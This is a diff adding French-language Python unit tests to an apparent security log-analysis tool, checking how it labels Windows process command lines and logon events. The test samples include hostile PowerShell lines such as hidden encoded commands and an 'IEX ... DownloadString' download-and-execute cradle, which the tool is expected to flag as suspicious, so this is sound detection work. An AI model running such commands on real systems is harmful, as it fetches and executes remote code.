@@ -303,6 +303,56 @@ class TestEtape3(unittest.TestCase):
                         "créé par l'attaquant"):
             self.assertIn(attendu, t)
 
+    def _nature_proc(self, process, parent, cmd):
+        ch = self._chronos([self._proc("2026-05-20T09:22:00Z", "SRV-FILE02", "u.trois",
+                                       process, parent, cmd)])[0]
+        return [q for q in ch.evenements
+                if q.evt.timestamp.strftime("%H:%M") == "09:22"][0]
+
+    def test_marqueurs_mots_entiers_faux_positifs(self):
+        for process, cmd in (
+                ("iexplore.exe", "C:\\Program Files\\Internet Explorer\\iexplore.exe"),
+                ("notepad.exe", "notepad.exe C:\\hidden\\a.txt"),
+                ("cmd.exe", "cmd.exe /c start -nopause")):
+            q = self._nature_proc(process, "explorer.exe", cmd)
+            self.assertEqual(q.nature, "processus_benin", cmd)
+            self.assertFalse(q.suspect)
+
+    def test_marqueurs_cas_positifs(self):
+        for cmd in ("powershell.exe -nop -w hidden -enc JABjAD0A",
+                    "powershell -EncodedCommand " + B64_GET_PROCESS,
+                    "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x')",
+                    "powershell -c iex(foo)",
+                    "powershell -c (New-Object Net.WebClient).DownloadString('http://x')"):
+            q = self._nature_proc("powershell.exe", "explorer.exe", cmd)
+            self.assertEqual(q.nature, "processus_suspect", cmd)
+
+    def test_commande_non_decodable_dans_evenement(self):
+        q = self._nature_proc("powershell.exe", "explorer.exe", "powershell -enc %%%")
+        self.assertEqual(q.commande_decodee, "non décodable")
+
+    def test_connexion_benigne_sur_host(self):
+        ch = self._chronos([{"timestamp": "2026-05-20T09:30:00Z", "event_id": 4624,
+                             "host": "SRV-FILE02", "account": "u.trois", "src_ip": "10.8.0.5",
+                             "logon_type": 2, "result": "success", "details": {}}])[0]
+        q = [x for x in ch.evenements if x.evt.timestamp.strftime("%H:%M") == "09:30"][0]
+        self.assertEqual(q.nature, "connexion")
+        self.assertFalse(q.suspect)
+
+    def test_ajout_groupe_non_privilegie(self):
+        ch = self._chronos([{"timestamp": "2026-05-20T09:31:00Z", "event_id": 4732,
+                             "host": "SRV-FILE02", "account": "u.trois", "src_ip": None,
+                             "logon_type": None, "result": "success",
+                             "details": {"group": "Comptabilité", "member": "u.trois"}}])[0]
+        q = [x for x in ch.evenements if x.evt.timestamp.strftime("%H:%M") == "09:31"][0]
+        self.assertEqual(q.nature, "ajout_groupe")
+        self.assertFalse(q.suspect)
+
+    def test_glose_explication(self):
+        t = expliquer_etape3(self._chronos(), False)
+        self.assertIn("contenu masqué", t)
+        self.assertIn("téléchargement d'un fichier depuis Internet", t)
+
     def test_explication_vide(self):
         self.assertIn("aucune compromission", expliquer_etape3([], False))
 
